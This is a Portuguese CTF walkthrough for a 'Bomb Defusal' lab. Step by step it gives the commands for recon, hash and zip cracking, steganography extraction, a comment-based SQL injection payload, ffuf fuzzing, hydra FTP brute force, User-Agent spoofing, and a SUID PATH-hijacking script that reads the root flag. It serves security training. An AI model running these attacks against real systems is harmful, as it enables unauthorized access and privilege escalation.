# Walkthrough - Bomb Defusal CTF

Este walkthrough descreve o caminho esperado de exploracao do CTF.
```

## 1. Reconhecimento

superficie de ataque: servicos expostos para web, FTP e SSH.

Como identificar:

```bash
nmap -T4 <ALVO> -A
```

Resultado esperado:

```text
FTP aberto
SSH aberto
HTTP aberto
```

Enumere a aplicacao web:

```bash
gobuster dir -u http://<ALVO>:<PORTA_HTTP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-x php,html,txt,css,js
```

O esperado e encontrar a aplicacao principal e diretorios publicos de conteudo. Inicie o desafio pela interface web antes de acessar os fios.

## 2. Fio Vermelho - Base64 Repetido

Vulnerabilidade ou falha: dado sensivel protegido apenas por codificacao reversivel.

Como identificar:

- A pagina mostra um texto grande com formato compativel com Base64.
- O comentario HTML sugere uma potencia de dois.

Exploracao esperada:

```bash
cp red_payload.txt red_work.txt
for i in $(seq 1 32); do
    base64 -d red_work.txt > red_next.txt
    mv red_next.txt red_work.txt
done
cat red_work.txt
```

Resultado esperado:

```text
<CODIGO_FIO_VERMELHO>
```

## 3. Fio Laranja - Hash com Salt

Vulnerabilidade ou falha: uso de hash fraco com salt previsivel e senha presente em wordlist.

Como identificar:

- A pagina exibe um hash.
- O comentario HTML indica que ha um salt.
- O tamanho do hash sugere MD5.

Exploracao esperada:

```bash
hashcat -m 10 -a 0 <HASH>:<SALT_INDICADO_NA_PISTA> \
/usr/share/wordlists/rockyou.txt --show
```

Resultado esperado:

```text
<CODIGO_FIO_LARANJA>
```

## 4. Fio Amarelo - Esteganografia em Video e Audio

Vulnerabilidade ou falha: informacao sensivel escondida em arquivos de midia.

Como identificar:

- A pagina entrega um arquivo de video.
- O comentario HTML chama atencao para o audio.
- Arquivos de midia devem ser analisados por trilhas e conteudo embutido.

Exploracao esperada:

```bash
wget http://<ALVO>:<PORTA_HTTP>/Content/challenge.mkv
ffmpeg -i challenge.mkv -vn -c:a pcm_s16le extracted_audio.wav
```

Extraia a mensagem escondida no audio:

```bash
steghide extract -sf extracted_audio.wav -p ""
cat audio_password.txt
```

Procure conteudo embutido no video:

```bash
binwalk challenge.mkv
binwalk -e challenge.mkv
find _challenge.mkv.extracted -type f -name "*.zip"
```

Abra o ZIP extraido usando a senha recuperada do audio:

```bash
unzip <ZIP_EXTRAIDO>
cat yellow_code.txt
```

Resultado esperado:

```text
<CODIGO_FIO_AMARELO>
```

## 5. Fio Verde - SQL Injection com Bypass de Filtro Client-Side

Vulnerabilidade: SQL injection por concatenacao direta de parametros no backend.

Como identificar:

- A pagina apresenta um formulario de login.
- O JavaScript bloqueia tokens como aspas, comentarios SQL e operadores logicos.
- A validacao ocorre no navegador, nao necessariamente no servidor.
- Interceptando a requisicao, e possivel alterar o corpo do POST depois da validacao local.

Exploracao esperada:

1. Abra o fio verde no navegador.
2. Intercepte o POST com Burp Suite.
3. Envie um payload que comente a verificacao da senha.

Modelo de payload:

```text
username=<USUARIO_VALIDO>'-- 
password=<QUALQUER_VALOR>
```

Resultado esperado:

```text
<CODIGO_FIO_VERDE>
```

## 6. Fio Azul - Fuzzing de Rota

Vulnerabilidade ou falha: rota secreta acessivel por parametro previsivel.

Como identificar:

- A pagina do fio disponibiliza uma wordlist.
- O comentario HTML sugere fuzzing.
- A aplicacao usa o parametro `route` para roteamento interno.

Exploracao esperada:

```bash
wget http://<ALVO>:<PORTA_HTTP>/Content/goodluck.txt
ffuf -u "http://<ALVO>:<PORTA_HTTP>/index.php?route=FUZZ" -w goodluck.txt
```

Acesse a rota encontrada:

```text
http://<ALVO>:<PORTA_HTTP>/index.php?route=<ROTA_ENCONTRADA>
```

Resultado esperado:

```text
<CODIGO_FIO_AZUL>
```

## 7. Fio Rosa - FTP e Brute Force

Vulnerabilidade ou falha: senha fraca em servico FTP.

Como identificar:

- O reconhecimento inicial mostra FTP aberto.
- O comentario HTML do fio sugere uma ferramenta de brute force.
- O desafio fornece pistas suficientes para escolher um usuario candidato.

Exploracao esperada:

```bash
hydra -l <USUARIO_FTP> -P /usr/share/wordlists/rockyou.txt ftp://<ALVO>
```

Com a credencial encontrada, entre no FTP:

```bash
ftp <ALVO>
```

Baixe os arquivos:

```text
get code.txt
get secret.zip
```

Leia a mensagem:

```bash
cat code.txt
```

Resultado esperado:

```text
<CODIGO_FIO_ROSA>
<USER_AGENT_VALIDO>
```

Guarde o `secret.zip`; ele sera usado na etapa de acesso ao sistema.

## 8. Fio Roxo - Controle por User-Agent

Vulnerabilidade ou falha: autorizacao baseada apenas no cabecalho `User-Agent`.

Como identificar:

- Sem o cabecalho correto, a aplicacao retorna acesso negado.
- A mensagem obtida no FTP indica o agente esperado.
- A autorizacao depende do valor textual do cabecalho HTTP.

Exploracao esperada:

```bash
curl -A "<USER_AGENT_VALIDO>" \
"http://<ALVO>:<PORTA_HTTP>/index.php?route=wire&id=<ID_FIO_ROXO>"
```

Resultado esperado:

```text
<CODIGO_FIO_ROXO>
```

## 9. Fio Ciano - Esteganografia em PNG

Vulnerabilidade ou falha: informacao sensivel escondida nos bits de uma imagem.

Como identificar:

- A pagina exibe uma imagem.
- Nao ha formulario nem logica web aparente.
- Imagens de CTF costumam exigir analise de metadados ou LSB.

Exploracao esperada:

```bash
wget http://<ALVO>:<PORTA_HTTP>/Content/trophy.png
zsteg trophy.png
```

Resultado esperado:

```text
<CODIGO_FIO_CIANO>
```

## 10. Desarme da Bomba

Depois de recuperar os oito codigos, volte ao painel principal da bomba e insira cada codigo no teclado hexadecimal.

Resultado esperado:

```text
Todos os fios cortados
Bomba desarmada
```

## 11. Acesso SSH

Vulnerabilidade ou falha: material de autenticacao exposto por cadeia de exploracao anterior.

Como identificar:

- O FTP fornece `secret.zip`.
- O ZIP contem material usado na etapa de acesso.
- Se o ZIP solicitar senha, trate-o como mais um artefato a ser quebrado ou extraido com a senha recuperada na cadeia de pistas.
- O SSH estava exposto desde o reconhecimento inicial.

Exploracao esperada:

```bash
unzip secret.zip
chmod 600 id_rsa
ssh -i id_rsa <USUARIO_SSH>@<ALVO> -p <PORTA_SSH>
```

Caso o ZIP esteja protegido, extraia ou quebre a senha antes:

```bash
zip2john secret.zip > secret_zip.hash
john --wordlist=<WORDLIST> secret_zip.hash
john --show secret_zip.hash
unzip -P <SENHA_ZIP> secret.zip
chmod 600 id_rsa
ssh -i id_rsa <USUARIO_SSH>@<ALVO> -p <PORTA_SSH>
```

Resultado esperado:

```text
Shell como usuario nao privilegiado
```

## 12. Escalada de Privilegios - SUID e PATH Hijacking

Vulnerabilidade: binario SUID executando comando externo sem caminho absoluto.

Como identificar:

Enumere binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Analise o binario suspeito:

```bash
ls -l /usr/local/bin/detonate
cat /var/www/app/Jobs/detonate.c
```

O problema esperado e uma chamada semelhante a:

```c
system("rm -rf /root/secret");
```

Como `rm` nao usa caminho absoluto, o sistema procura esse binario pelo `PATH`. Com isso, um atacante pode colocar um `rm` falso antes do diretorio real.

Exploracao esperada:

```bash
mkdir -p /tmp/hijack
cat > /tmp/hijack/rm <<'EOF'
#!/bin/sh
id > /tmp/path_hijack_proof.txt
cat /root/flag.txt > /tmp/root_flag.txt
chmod 644 /tmp/root_flag.txt
exit 0
EOF
chmod +x /tmp/hijack/rm
```

Execute o binario SUID com o `PATH` controlado:

```bash
PATH=/tmp/hijack:$PATH /usr/local/bin/detonate
```

Confirme a execucao privilegiada:

```bash
cat /tmp/path_hijack_proof.txt
cat /tmp/root_flag.txt
```

Resultado esperado:

```text
<PROVA_DE_EXECUCAO_COMO_ROOT>
<FLAG_ROOT>
```

## Resumo das Vulnerabilidades

| Etapa | Vulnerabilidade ou tecnica | Quebra esperada |
| --- | --- | --- |
| Fio vermelho | Codificacao reversivel | Base64 repetido |
| Fio laranja | Hash fraco com salt previsivel | Hashcat com wordlist |
| Fio amarelo | Esteganografia em midia | ffmpeg, steghide e binwalk |
| Fio verde | SQL injection | Bypass de filtro client-side via Burp |
| Fio azul | Rota oculta previsivel | Fuzzing com ffuf |
| Fio rosa | Senha fraca no FTP | Hydra com wordlist |
| Fio roxo | Autorizacao por User-Agent | Cabecalho HTTP customizado |
| Fio ciano | Esteganografia em PNG | zsteg |
| Escalada | SUID com PATH hijacking | Binario falso no PATH |
